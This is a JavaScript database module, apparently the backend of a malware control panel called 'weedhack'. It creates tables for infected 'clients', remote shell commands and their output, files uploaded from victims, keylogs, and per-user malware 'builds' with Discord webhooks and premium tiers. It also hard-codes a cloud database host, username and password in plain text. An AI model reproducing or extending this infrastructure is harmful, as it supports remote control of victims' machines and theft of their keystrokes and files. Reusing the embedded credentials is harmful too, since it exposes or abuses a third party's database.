// language: JavaScript, file: db.js
import mysql from 'mysql2/promise';
import fs from 'node:fs';
import path from 'node:path';
import 'dotenv/config';

export const UPLOAD_DIR = process.env.UPLOAD_DIR || './data/uploads';

function ensureDir(p, mode = 0o700) {
  if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true, mode });
}

ensureDir(UPLOAD_DIR);

const DB_NAME = 'weedhack';

// Base config (no database specified initially)
const DB_CONFIG = {
  host: 'gateway01.eu-central-1.prod.aws.tidbcloud.com',
  port: 4000,
  user: '4Dosrowwv3DgbU6.root',
  password: 'HuXBzVJiMf8Sz4YL',
  waitForConnections: true,
  connectionLimit: 20,
  queueLimit: 0,
  supportBigNumbers: true,
  bigNumberStrings: false,
  ssl: {
    minVersion: 'TLSv1.2',
    rejectUnauthorized: true
  }
};

if (fs.existsSync('/etc/ssl/certs/ca-certificates.crt')) {
  DB_CONFIG.ssl.ca = fs.readFileSync('/etc/ssl/certs/ca-certificates.crt');
}

// Create the pool pointing to the specific database
export const pool = mysql.createPool({
  ...DB_CONFIG,
  database: DB_NAME
});

export async function initDb() {
  // 1. Auto-create the database if it doesn't exist
  try {
    const tempConn = await mysql.createConnection(DB_CONFIG);
    await tempConn.query(`CREATE DATABASE IF NOT EXISTS \`${DB_NAME}\``);
    await tempConn.end();
    console.log(`[db] Database '${DB_NAME}' verified/created.`);
  } catch (e) {
    console.error(`[db] Failed to create database '${DB_NAME}':`, e.message);
    // We continue anyway, in case the user only has access to the DB but not the global CREATE privilege
  }

  // 2. Create the tables inside the database
  const tables = [
    `CREATE TABLE IF NOT EXISTS users (
      id            BIGINT PRIMARY KEY AUTO_INCREMENT,
      username      VARCHAR(255) UNIQUE NOT NULL,
      email         VARCHAR(255) UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      account_key   VARCHAR(255) UNIQUE NOT NULL,
      login_token   VARCHAR(255) UNIQUE,
      discord_webhook TEXT NOT NULL,
      created_at    BIGINT NOT NULL,
      premium_until BIGINT DEFAULT 0
    );`,
    `CREATE TABLE IF NOT EXISTS clients (
      id         BIGINT PRIMARY KEY AUTO_INCREMENT,
      user_id    BIGINT NOT NULL,
      \`key\`      VARCHAR(255) NOT NULL,
      hostname   VARCHAR(255) NOT NULL,
      ip         VARCHAR(255),
      last_seen  BIGINT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );`,
    `CREATE TABLE IF NOT EXISTS commands (
      id         BIGINT PRIMARY KEY AUTO_INCREMENT,
      user_id    BIGINT NOT NULL,
      client_id  BIGINT NOT NULL,
      shell      VARCHAR(255) NOT NULL,
      line       TEXT NOT NULL,
      output     LONGTEXT,
      status     VARCHAR(255) NOT NULL DEFAULT 'pending',
      created_at BIGINT NOT NULL,
      FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );`,
    `CREATE TABLE IF NOT EXISTS uploads (
      id          BIGINT PRIMARY KEY AUTO_INCREMENT,
      user_id     BIGINT NOT NULL,
      client_id   BIGINT NOT NULL,
      filename    VARCHAR(255) NOT NULL,
      stored_name VARCHAR(255) UNIQUE NOT NULL,
      size        BIGINT NOT NULL,
      created_at  BIGINT NOT NULL,
      FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );`,
    `CREATE TABLE IF NOT EXISTS keylogs (
      id         BIGINT PRIMARY KEY AUTO_INCREMENT,
      user_id    BIGINT NOT NULL,
      client_id  BIGINT NOT NULL,
      data       TEXT NOT NULL,
      created_at BIGINT NOT NULL,
      FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );`,
    `CREATE TABLE IF NOT EXISTS builds (
      id          BIGINT PRIMARY KEY AUTO_INCREMENT,
      user_id     BIGINT NOT NULL,
      name        VARCHAR(255) NOT NULL,
      stored_name VARCHAR(255) UNIQUE NOT NULL,
      size        BIGINT NOT NULL,
      base        VARCHAR(255) NOT NULL,
      \`key\`       VARCHAR(255) NOT NULL,
      config      TEXT NOT NULL,
      created_at  BIGINT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );`
  ];

  for (const q of tables) {
    await pool.query(q);
  }
}

export default pool;